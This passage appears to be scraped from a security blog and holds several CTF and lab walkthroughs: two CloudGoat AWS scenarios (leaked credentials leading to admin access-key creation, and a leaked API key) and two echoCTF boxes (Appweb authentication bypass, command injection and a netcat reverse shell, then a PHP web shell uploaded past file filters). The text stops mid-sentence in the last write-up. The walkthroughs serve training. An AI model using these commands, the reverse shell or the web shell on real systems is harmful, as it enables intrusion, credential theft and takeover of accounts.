beanstalk which is the name of the lab I found the folloing description\nAWS Elastic Beanstalk enables customers to easily migrate, deploy, and scale full-stack applications\nKnowing this we can use aws cli to enumrate beanstalk applications and see what we have available\nManually enumerating Elastic Applications aws elasticbeanstalk describe-applications --profile low_priv { \u0026#34;Applications\u0026#34;: [ { \u0026#34;ApplicationArn\u0026#34;: \u0026#34;arn:aws:elasticbeanstalk:us-east-1:289202785296:application/cgid9oc3krm0fl-app\u0026#34;, \u0026#34;ApplicationName\u0026#34;: \u0026#34;cgid9oc3krm0fl-app\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Elastic Beanstalk application for insecure secrets scenario\u0026#34;, \u0026#34;DateCreated\u0026#34;: \u0026#34;2025-08-21T06:54:26.949000+00:00\u0026#34;, \u0026#34;DateUpdated\u0026#34;: \u0026#34;2025-08-21T06:54:26.949000+00:00\u0026#34;, \u0026#34;ConfigurationTemplates\u0026#34;: [], \u0026#34;ResourceLifecycleConfig\u0026#34;: { \u0026#34;VersionLifecycleConfig\u0026#34;: { \u0026#34;MaxCountRule\u0026#34;: { \u0026#34;Enabled\u0026#34;: false, \u0026#34;MaxCount\u0026#34;: 200, \u0026#34;DeleteSourceFromS3\u0026#34;: false }, \u0026#34;MaxAgeRule\u0026#34;: { \u0026#34;Enabled\u0026#34;: false, \u0026#34;MaxAgeInDays\u0026#34;: 180, \u0026#34;DeleteSourceFromS3\u0026#34;: false } } } } ] } Now we have an application name\nWe could also gather more information about the elastic application such as its environment details\naws elasticbeanstalk describe-environments --application-name cgid9oc3krm0fl-app --profile low_priv { \u0026#34;Environments\u0026#34;: [ { \u0026#34;EnvironmentName\u0026#34;: \u0026#34;cgid9oc3krm0fl-env\u0026#34;, \u0026#34;EnvironmentId\u0026#34;: \u0026#34;e-xi5rv9xfmb\u0026#34;, \u0026#34;ApplicationName\u0026#34;: \u0026#34;cgid9oc3krm0fl-app\u0026#34;, \u0026#34;SolutionStackName\u0026#34;: \u0026#34;64bit Amazon Linux 2023 v4.7.1 running Python 3.11\u0026#34;, \u0026#34;PlatformArn\u0026#34;: \u0026#34;arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.7.1\u0026#34;, \u0026#34;EndpointURL\u0026#34;: \u0026#34;awseb-e-x-AWSEBLoa-DRIY4MZGVVYS-1616084218.us-east-1.elb.amazonaws.com\u0026#34;, \u0026#34;CNAME\u0026#34;: \u0026#34;cgid9oc3krm0fl-env.eba-zppuezsg.us-east-1.elasticbeanstalk.com\u0026#34;, \u0026#34;DateCreated\u0026#34;: \u0026#34;2025-08-21T06:54:43.342000+00:00\u0026#34;, \u0026#34;DateUpdated\u0026#34;: \u0026#34;2025-08-21T06:57:41.594000+00:00\u0026#34;, \u0026#34;Status\u0026#34;: \u0026#34;Ready\u0026#34;, \u0026#34;AbortableOperationInProgress\u0026#34;: false, \u0026#34;Health\u0026#34;: \u0026#34;Grey\u0026#34;, \u0026#34;HealthStatus\u0026#34;: \u0026#34;No Data\u0026#34;, \u0026#34;Tier\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;WebServer\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;Standard\u0026#34;, \u0026#34;Version\u0026#34;: \u0026#34;1.0\u0026#34; }, \u0026#34;EnvironmentLinks\u0026#34;: [], \u0026#34;EnvironmentArn\u0026#34;: \u0026#34;arn:aws:elasticbeanstalk:us-east-1:289202785296:environment/cgid9oc3krm0fl-app/cgid9oc3krm0fl-env\u0026#34; } ] } We also have the applications environment name\nEquiped with this information we can now pull the application\u0026rsquo;s configuration including its environment variables and possibily discover critical info.\naws elasticbeanstalk describe-configuration-settings --application-name cgid9oc3krm0fl-app --environment-name cgid9oc3krm0fl-env --profile low_priv \u0026#34;ConfigurationSettings\u0026#34;: [ { ---\u0026lt;snip\u0026gt;--- { \u0026#34;Namespace\u0026#34;: \u0026#34;aws:cloudformation:template:parameter\u0026#34;, \u0026#34;OptionName\u0026#34;: \u0026#34;EnvironmentVariables\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;SECONDARY_SECRET_KEY=[REDACTED-CTF2],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIA[REDACTED-CTF2]\u0026#34; } ---\u0026lt;snip\u0026gt;--- Found Keys within the environment variables This enumeration could also be done using pacu.\nAutomating the process with pacu Pacu (low_priv_sess:imported-low_priv_sess) \u0026gt; run elasticbeanstalk__enum --regions us-east-1 Running module elasticbeanstalk__enum... [elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1... [elasticbeanstalk__enum] 1 application(s) found in us-east-1. [elasticbeanstalk__enum] 1 environment(s) found in us-east-1. Potential secret in environment variable: SSHSourceRestriction =\u0026gt; tcp,22,22,0.0.0.0/0 Potential secret in environment variable: EnvironmentVariables =\u0026gt; SECONDARY_SECRET_KEY=[REDACTED-CTF2],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIA[REDACTED-CTF2] Potential secret in environment variable: SECONDARY_ACCESS_KEY =\u0026gt; AKIA[REDACTED-CTF2] Now lets create another profile with the new credentilas that we have and start our enumeration process as we did before\nSecondary Credentials Creating aws profile with secondary credentials aws configure --profile env_key AWS Access Key ID [None]: AKIA[REDACTED-CTF2] AWS Secret Access Key [None]: [REDACTED-CTF2] Default region name [None]: us-east-1 Default output format [None]: json Called the new profile env_key since we got the credentials from the environemnt variables\nwhoami\naws sts get-caller-identity --profile env_key { \u0026#34;UserId\u0026#34;: \u0026#34;AIDAUGVOUJQIKXL6FUYGK\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;289202785296\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_secondary_user\u0026#34; } Username of the new user is cgid9oc3krm0fl_secondary_user\nusing pacu to enumerate the IAM permissions of the new user using another module called \u0026ldquo;iam__enum_permissions\u0026rdquo;\nchecking our permissions\nPacu (env_key:imported-env_key) \u0026gt; whoami { \u0026#34;UserName\u0026#34;: \u0026#34;cgid9oc3krm0fl_secondary_user\u0026#34;, \u0026#34;RoleName\u0026#34;: null, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_secondary_user\u0026#34;, \u0026#34;AccountId\u0026#34;: \u0026#34;289202785296\u0026#34;, \u0026#34;UserId\u0026#34;: \u0026#34;AIDAUGVOUJQIKXL6FUYGK\u0026#34;, \u0026#34;Roles\u0026#34;: null, \u0026#34;Groups\u0026#34;: [], \u0026#34;Policies\u0026#34;: [ { \u0026#34;PolicyName\u0026#34;: \u0026#34;cgid9oc3krm0fl_secondary_policy\u0026#34;, \u0026#34;PolicyArn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:policy/cgid9oc3krm0fl_secondary_policy\u0026#34; } ], \u0026#34;AccessKeyId\u0026#34;: \u0026#34;AKIA[REDACTED-CTF2]\u0026#34;, \u0026#34;SecretAccessKey\u0026#34;: \u0026#34;[REDACTED-CTF2]\u0026#34;, \u0026#34;SessionToken\u0026#34;: null, \u0026#34;KeyAlias\u0026#34;: \u0026#34;imported-env_key\u0026#34;, \u0026#34;PermissionsConfirmed\u0026#34;: false, \u0026#34;Permissions\u0026#34;: { \u0026#34;Allow\u0026#34;: { \u0026#34;iam:createaccesskey\u0026#34;: { \u0026#34;Resources\u0026#34;: [ \u0026#34;*\u0026#34; ] }, ---\u0026lt;snip\u0026gt;--- It seems that we can create access keys for any IAM user that exists!\nWe could also autmote this process using pacu module called iam__privesc__scan\nPacu (env_key:imported-env_key) \u0026gt; run iam__privesc_scan --scan-only Running module iam__privesc_scan... [iam__privesc_scan] Escalation methods for current user: [iam__privesc_scan] POTENTIAL: AddUserToGroup [iam__privesc_scan] POTENTIAL: AttachGroupPolicy [iam__privesc_scan] POTENTIAL: AttachRolePolicy [iam__privesc_scan] POTENTIAL: AttachUserPolicy [iam__privesc_scan] POTENTIAL: CodeStarCreateProjectFromTemplate [iam__privesc_scan] POTENTIAL: CodeStarCreateProjectThenAssociateTeamMember [iam__privesc_scan] \u0026#39;CONFIRMED: CreateAccessKey\u0026#39; [iam__privesc_scan] POTENTIAL: CreateEC2WithExistingIP CONFIRMED! Our user can indeed create access keys\nLets check what users exist on the account\naws iam list-users --profile env_key { \u0026#34;Users\u0026#34;: [ { \u0026#34;Path\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;UserName\u0026#34;: \u0026#34;cgid9oc3krm0fl_admin_user\u0026#34;, \u0026#34;UserId\u0026#34;: \u0026#34;AIDAUGVOUJQIHFF3KCAV5\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_admin_user\u0026#34;, \u0026#34;CreateDate\u0026#34;: \u0026#34;2025-08-21T06:54:26+00:00\u0026#34; }, ---\u0026lt;snip\u0026gt;-- ] } -There is an admin user!\nWe can create keys for the admin user and backdoor that accont!\naws iam create-access-key --user-name cgid9oc3krm0fl_admin_user --profile env_key { \u0026#34;AccessKey\u0026#34;: { \u0026#34;UserName\u0026#34;: \u0026#34;cgid9oc3krm0fl_admin_user\u0026#34;, \u0026#34;AccessKeyId\u0026#34;: \u0026#34;AKIA[REDACTED-ADMIN]\u0026#34;, \u0026#34;Status\u0026#34;: \u0026#34;Active\u0026#34;, \u0026#34;SecretAccessKey\u0026#34;: \u0026#34;[REDACTED-ADMIN]\u0026#34;, \u0026#34;CreateDate\u0026#34;: \u0026#34;2025-08-21T11:58:24+00:00\u0026#34; } } Perfect, let create a new admin profile with the new keys\naws configure --profile beanstalk_admin AWS Access Key ID [None]: AKIA[REDACTED-ADMIN] AWS Secret Access Key [None]: [REDACTED-ADMIN] Default region name [None]: us-east-1 Default output format [None]: json Lets get the flag by dumping the secrets manager\naws secretsmanager list-secrets --profile beanstalk_admin { \u0026#34;SecretList\u0026#34;: [ { \u0026#34;ARN\u0026#34;: \u0026#34;arn:aws:secretsmanager:us-east-1:289202785296:secret:cgid9oc3krm0fl_final_flag-V5tMVD\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;cgid9oc3krm0fl_final_flag\u0026#34;, \u0026#34;LastChangedDate\u0026#34;: \u0026#34;2025-08-21T01:54:27.561000-05:00\u0026#34;, \u0026#34;LastAccessedDate\u0026#34;: \u0026#34;2025-08-20T19:00:00-05:00\u0026#34;, \u0026#34;Tags\u0026#34;: [ { ---\u0026lt;snip\u0026gt;--- ","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/writeups/cloudgoat/beanstalk_secrets/beanstalk_secrets/","section":"writeups","tags":["AWC CLI","Pacu","beanstalk"],"title":"Cloudgoat Beanstalk_Secrets Walkthrou"},{"categories":["Cloud","AWS"],"contents":"Initial Access / Credentials sns_user_access_key_id = AKIA[REDACTED-CTF] sns_user_secret_access_key = [REDACTED-CTF] AWC CLI profile creation aws configure --profile sns AWS Access Key ID [None]: AKIA[REDACTED-CTF] AWS Secret Access Key [None]: [REDACTED-CTF] Default region name [None]: us-east-1 Default output format [None]: json -Created an aws profile with the credentials given\nIAM Enumeration with sns credentials whoami\n‚îî‚îÄ$ aws sts get-caller-identity --profile sns { \u0026#34;UserId\u0026#34;: \u0026#34;AIDAUGVOUJQILY3KHBHBA\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;289202785296\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::289202785296:user/cg-sns-user-cgid6j1kvw51kk\u0026#34; } Got username cg-sns-user-cgid6j1kvw51kk\nList Users Roles Policies and Groups\naws iam list-users --profile sns aws iam list-roles --profile sns aws iam list-policies --profile sns aws iam list-groups-for-user --user-name cg-sns-user-cgid6j1kvw51kk --profile sns { \u0026#34;Groups\u0026#34;: [] } We dont have permission to list users, roles, policies but we did for groups which it seems nothing is there\nLists managed and inline policies for our user\nList managed user policies\naws iam list-attached-user-policies --user-name cg-sns-user-cgid6j1kvw51kk --profile sns { \u0026#34;AttachedPolicies\u0026#34;: [] } List inline user policies\naws iam list-user-policies --user-name cg-sns-user-cgid6j1kvw51kk --profile sns { \u0026#34;PolicyNames\u0026#34;: [ \u0026#34;cg-sns-user-policy-cgid6j1kvw51kk\u0026#34; ] } It seems that we finally found something. Our user has a custom policy attatched to it.\nGet user inline policy details\naws iam get-user-policy --user-name cg-sns-user-cgid6j1kvw51kk --policy-name cg-sns-user-policy-cgid6j1kvw51kk --profile sns { \u0026#34;UserName\u0026#34;: \u0026#34;cg-sns-user-cgid6j1kvw51kk\u0026#34;, \u0026#34;PolicyName\u0026#34;: \u0026#34;cg-sns-user-policy-cgid6j1kvw51kk\u0026#34;, \u0026#34;PolicyDocument\u0026#34;: { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Action\u0026#34;: [ \u0026#34;sns:Subscribe\u0026#34;, \u0026#34;sns:Receive\u0026#34;, \u0026#34;sns:ListSubscriptionsByTopic\u0026#34;, \u0026#34;sns:ListTopics\u0026#34;, \u0026#34;sns:GetTopicAttributes\u0026#34;, \u0026#34;iam:ListGroupsForUser\u0026#34;, \u0026#34;iam:ListUserPolicies\u0026#34;, \u0026#34;iam:GetUserPolicy\u0026#34;, \u0026#34;iam:ListAttachedUserPolicies\u0026#34;, \u0026#34;apigateway:GET\u0026#34; ], \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Action\u0026#34;: \u0026#34;apigateway:GET\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Deny\u0026#34;, \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:apigateway:us-east-1::/apikeys\u0026#34;, \u0026#34;arn:aws:apigateway:us-east-1::/apikeys/*\u0026#34;, \u0026#34;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET\u0026#34;, \u0026#34;arn:aws:apigateway:us-east-1::/restapis/*/methods/GET\u0026#34;, \u0026#34;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration\u0026#34;, \u0026#34;arn:aws:apigateway:us-east-1::/restapis/*/integration\u0026#34;, \u0026#34;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration\u0026#34; ] } ] } } Most of the iam permissions we already enumerated but it seems we can enumerate more on sns and apigateway\nBut first\u0026hellip; What is SNS in AWS?\nAmazon Simple Notification Service (Amazon SNS) is a web service that **makes it easy to set up, operate, and send notifications from the cloud**. SNS Enumeration Listing SNS Topics\naws sns list-topics --profile sns { \u0026#34;Topics\u0026#34;: [ { \u0026#34;TopicArn\u0026#34;: \u0026#34;arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk\u0026#34; } ] } We got the arn of 1 topic.But lets continue our enumeration and extract all the information we can with the permissions that we have\nGet SNS Topic Attributes\naws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --region us-east-1 --profile sns aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --profile sns Subscirbe to a SNS Topic\nFor this one i used pacu. Also to successfully subscribe to an SNS topic we need the Topic ARN as well as a working email!\nrun sns__subscribe --topics arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --email dotpirate@dotpirate.rocks After subscribing I recreived an email to which I had to click the link to activate the subscription and right after that I recieved a second email with an API GATEWAY KEY! 45a3da61***********\nSo what can i do with this key.. Since I am new into this i start googling around about how could I escalate my privileges using the API GATEWAY. Additionally, i checked the description of the lab and it says tha we have to query the endpoint to get the flag! I found that in order to query the endpoint we need the api-id, region, stage and the path So lets get those\u0026hellip;\nEnumerating REST APIs\n{ \u0026#34;items\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;5btvmrrlfi\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;cg-api-cgid6j1kvw51kk\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;API for demonstrating leaked API key scenario\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2025-08-21T07:34:51-05:00\u0026#34;, \u0026#34;apiKeySource\u0026#34;: \u0026#34;HEADER\u0026#34;, \u0026#34;endpointConfiguration\u0026#34;: { \u0026#34;types\u0026#34;: [ \u0026#34;EDGE\u0026#34; ], \u0026#34;ipAddressType\u0026#34;: \u0026#34;ipv4\u0026#34; }, \u0026#34;tags\u0026#34;: { \u0026#34;Scenario\u0026#34;: \u0026#34;iam_privesc_by_key_rotation\u0026#34;, \u0026#34;Stack\u0026#34;: \u0026#34;CloudGoat\u0026#34; }, \u0026#34;disableExecuteApiEndpoint\u0026#34;: false, \u0026#34;rootResourceId\u0026#34;: \u0026#34;7fezg1k4h5\u0026#34; } ] Got the REST api id\nEnumerating All Accessible API Endpoints\naws apigateway get-resources --rest-api-id 5btvmrrlfi --profile sns { \u0026#34;items\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;7fezg1k4h5\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;ernlg7\u0026#34;, \u0026#34;parentId\u0026#34;: \u0026#34;7fezg1k4h5\u0026#34;, \u0026#34;pathPart\u0026#34;: \u0026#34;user-data\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/user-data\u0026#34;, \u0026#34;resourceMethods\u0026#34;: { \u0026#34;GET\u0026#34;: {} } } ] } Now we got the path\nFinding the stage name\naws apigateway get-resources --rest-api-id 5btvmrrlfi --profile sns { \u0026#34;items\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;7fezg1k4h5\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/\u0026#34; }, { \u0026#34;id\u0026#34;: \u0026#34;ernlg7\u0026#34;, \u0026#34;parentId\u0026#34;: \u0026#34;7fezg1k4h5\u0026#34;, \u0026#34;pathPart\u0026#34;: \u0026#34;user-data\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/user-data\u0026#34;, \u0026#34;resourceMethods\u0026#34;: { \u0026#34;GET\u0026#34;: {} } } ] } We got everyhing and we can build the URL!\nPutting all together to form the HTTP request\ncurl -v -H \u0026#34;x-api-key: \u0026lt;your-api-key\u0026gt;\u0026#34; https://\u0026lt;api-id\u0026gt;.execute-api.\u0026lt;region\u0026gt;.amazonaws.com/\u0026lt;stage\u0026gt;/flag curl -H \u0026#34;x-api-key: 45a3d************\u0026#34; \u0026#39;https://5btvmrrlfi.execute-api.us-east-1.amazonaws.com/prod-cgid6j1kvw51kk/user-data\u0026#39; {\u0026#34;final_flag\u0026#34;:\u0026#34;FLAG{SNS_S3cr3ts_ar3_FUN}\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Access granted\u0026#34;,\u0026#34;user_data\u0026#34;:{\u0026#34;email\u0026#34;:\u0026#34;SuperAdmin@notarealemail.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;p@ssw0rd123\u0026#34;,\u0026#34;user_id\u0026#34;:\u0026#34;1337\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;SuperAdmin\u0026#34;}} ","date":"2025-08-21T00:00:00Z","permalink":"https://hack.com.cy/writeups/cloudgoat/sns_secrets/sns_secrets/","section":"writeups","tags":["AWC CLI","Pacu","SNS"],"title":"Cloudgoat SNS_Secrets Walkthrou"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Bart Enumeration NMAP sudo nmap 10.0.50.0 -A -p- -T4 NMAP OUTPUT 8080/tcp open http-proxy | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Digest algorithm=MD5 stale=FALSE opaque=799d5 realm=example.com qop=auth domain=/ nonce=YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODA0MWYyNjo2 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 401 Unauthorized | Vary: Accept-Encoding | X-Frame-Options: SAMEORIGIN | Content-Type: text/html | X-Content-Type-Options: nosniff | Date: Sun, 17 Aug 2025 12:29:48 GMT | Cache-Control: no-cache | Content-Length: 229 | X-XSS-Protection: 1; mode=block | Connection: close | WWW-Authenticate: Digest realm=\u0026#34;example.com\u0026#34;, domain=\u0026#34;/\u0026#34;, qop=\u0026#34;auth\u0026#34;, nonce=\u0026#34;YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODAxZTMyMTo0\u0026#34;, opaque=\u0026#34;799d5\u0026#34;, algorithm=\u0026#34;MD5\u0026#34;, stale=\u0026#34;FALSE\u0026#34; | Accept-Ranges: bytes | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Unauthorized\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h2\u0026gt;Access Error: 401 -- Unauthorized\u0026lt;/h2\u0026gt; | \u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | GetRequest: | HTTP/1.0 401 Unauthorized | Vary: Accept-Encoding | X-Frame-Options: SAMEORIGIN | Content-Type: text/html | X-Content-Type-Options: nosniff | Date: Sun, 17 Aug 2025 12:29:47 GMT | Cache-Control: no-cache | Content-Length: 229 | X-XSS-Protection: 1; mode=block | Connection: close | WWW-Authenticate: Digest realm=\u0026#34;example.com\u0026#34;, domain=\u0026#34;/\u0026#34;, qop=\u0026#34;auth\u0026#34;, nonce=\u0026#34;YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODAxZTE4Mjoz\u0026#34;, opaque=\u0026#34;799d5\u0026#34;, algorithm=\u0026#34;MD5\u0026#34;, stale=\u0026#34;FALSE\u0026#34; | Accept-Ranges: bytes | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Unauthorized\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h2\u0026gt;Access Error: 401 -- Unauthorized\u0026lt;/h2\u0026gt; | \u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Vary: Accept-Encoding | X-Frame-Options: SAMEORIGIN | Content-Type: text/html | X-Content-Type-Options: nosniff | Date: Sun, 17 Aug 2025 12:29:47 GMT | Cache-Control: no-cache | Content-Length: 241 | X-XSS-Protection: 1; mode=block | Connection: close | Accept-Ranges: bytes | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Method Not Allowed\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h2\u0026gt;Access Error: 405 -- Method Not Allowed\u0026lt;/h2\u0026gt; | \u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; The NMAP scan found an open port on 8080 and it seems that is a webserver.\nVisiting the webserver we are required to provide credentials to proceed.\nI found out that this type of authentication i called Digest Access Authentication\nThen tried different kind of default credentials like admin:admin administrato:administrator guest:guest but nothing worked. I did not tried brute forcing as the description of the box clearly mentions that, brute force is not the way to go.\nThen I tried to further fingerprint the server using whatweb but got nothing interesting back\u0026hellip;\nsudo whatweb http://10.0.50.0:8080/ -vv I also tried using nc, but again i could identify the web server running.\nsudo nc -nvC 10.0.50.0 8080 (UNKNOWN) [10.0.50.0] 8080 (http-alt) open HELP VERSION Then i tried directory brute forcing with various kind of wordlists but nothing came back\ngobuster dir -u http://10.0.50.0:8080/ -w /usr/share/wordlists/ Here I was stuck i did not know what to do next so I went back to the description of the box noticed that a few words where bolded App Web embed this.\nThe i went i head and googled those exact words. And found out that there is indeed a a small Application Web server usually found on embedded systems.\nSo then i went ahead and search for exploits related to that specific web server and authentication bypass since the description says that no credentials are required.\nFound an article which also provided a pyhton PoC!\nI copied the exploit locally and it run successfully printing back a session cookie as the admin user!\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/echoCTF/bart/exploits] ‚îî‚îÄ$ python2.7 ex.py -t http://10.0.50.0:8080 -u admin ---------------------------------------------------------------- Embedthis Appweb/Http Zero-Day Form/Digest Authentication Bypass ---------------------------------------------------------------- [+] Potential appweb/embedthis http, digest method [!] Exploiting http://10.0.50.0:8080, user admin! [*] Succesfully exploited, here\u0026#39;s your c00kie: {\u0026#39;-http-session-\u0026#39;: \u0026#39;72::http.session::bda36ec6dce1ac1124b0f2c46795f830\u0026#39;} Then i used a FireFox extension called cookie editor to inject the cookie.\nRefreshing the session i was able to login as admin bypassing the authentication!\nWhen the button is clicked we are redirected to /ETSCTf.cgi?ETSCTF= and we get 401 Unauthorized\nFrom here i attempted to FUZZ the value of the ETSCTF parameter as well as the paramater name itself.\nFor the parameter value i used a wordlist that checks for directory traversal and another wordlists with just random words in order to see if could guess any value that could return data back, but that was a dead end.\nFor the parameter name i only used a wordlist with just words but that did not yield any results back.\nThen i have noticed that the letter f in the ETSCTf.cgi is not capital so i changed it and got back a different request with a flag!\nNow I fuzzed the value of the parameter to see if I hit any value that will give us more information. To do this i copied the GET request to a file locally which i called param.txt and modified the request by adding the FUZZ keyword at the value.\nNow we can use ffuf to brute force that value with a wordlist of our choice. I forwarded all attempts through burp using the -x flag in order to be able to view and analyze the requests.\nffuf -X GET -request ../param.txt -request-proto \u0026#34;http\u0026#34; -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x http://127.0.0.1:8080 Then by filtering the requests in burp based on length it seems that we can execute commands on the server!\nGetting a reverse shell was easy as nc was installed on the target server.\nsudo nc -nvlp 80 GET /ETSCTF.cgi?ETSCTF=nc+10.10.11.150+80+-e+/bin/bash ROOT!\n","date":"2025-08-17T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/bart/bart/","section":"writeups","tags":["authentication bypass","fuzzing","ffuf","web","CVE-2018-8715"],"title":"echoCTF Bart Writeup: Digest Authentication Bypass to root"},{"categories":["CTF","OSCP Prep","echoCTF"],"contents":"Enumeration Start by port scanning the target machine. And reading the description of the box that highlight the keyword beer and the following: Provide a steady supply of beer and you may get something more than a BURRRRRRPPPP!\nNMAP sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV NMAP Output PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST Found an Apache webserver version 2.4.38 running on port 80.\nSince is Apache we know its using PHP by default, also by visiting the page we see that there is an upload functionality with a \u0026ldquo;message\u0026rdquo; saying that it does not accept PHP files.\nStart a directory brute force to search for hidden files\ngobuster dir -u http://10.0.50.0/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt - root-rsw.txt # Nothing Interesting Found Lets try to upload a .txt file to the application.\ncat test.txt dotpirate Exploitation Trying to upload different file formats such as .png .jpg .svg gives us the same response. Then tried more file formats using brute force and a wordlist which again gave us back the same response. We can automate this with ffuf likewise.\nFirst save the POST request from burp to a file locally Then edit the file and add the word FUZZ in the place you want to brute force.\nNow we can utilize ffuf to do the brute force\nffuf -X POST -request upload.txt -request-proto \u0026#34;http\u0026#34; -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt We can also view the request sent by ffuf through burp to make sure the attack is done as expected.\nTo do this we have to add the -x flag which allows us to specify a proxy\nffuf -X POST -request upload.txt -request-proto \u0026#34;http\u0026#34; -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt -x http://127.0.0.1:8080 However as you can see all of the tries came back with the same error.\nMore attacks/techniques on how to attack file upload functionality along with my personal methodology can be found here\nAfter multiple attempts and different techniques I went back and read the description. Then I begun to replace values of the upload requests with the word beer.\nAnd it worked!\nSo now, I started removing the word beer one by one and resend the request in order to understand which value is the one that allows us to bypass that restriction.\nIt seems that the property name within the upload POST request is the one that requires the word beer to proceed with the upload\nSo now that we can finally upload files lets try to upload a malicious PHP web shell!\ncat shell.php \u0026lt;?php system($_REQUEST[\u0026#39;dotpirate\u0026#39;]); ?\u0026gt; But he hit another wall with a different error now.. Back to fuzzing!\nFirst i tried fuzzing the filename extension using ffuf and see if i can get any PHP equivalent files to pass such as php3, php4 etc. This wordlist can be found here\nModified my POST request.\nffuf -X POST -request upload.txt -request-proto \u0026#34;http\u0026#34; -w ./php-extensions.txt -x http://127.0.0.1:8080 It seems that we managed to upload multiple files on the server\nHowever when we try to access and execute our web shell it does not work so now we can guess that there must be a security control behind this website which allows specific PHP versions to be executed.\nSomething that i have missed however is that whenever we upload a file successfully the file is saved in the root directory of the webserver \u0026ldquo;/\u0026rdquo;. This means that we can attempt to upload a .htaccess and hopefully replace the one that is on the server allowing our own file extensions to be uploaded!\nIf you do not know what .htaccess is, it is worth give it a 5 min look!\ncat .htaccess AddType application/x-httpd-php .dotpirate It seems that the file uploaded successfully without any 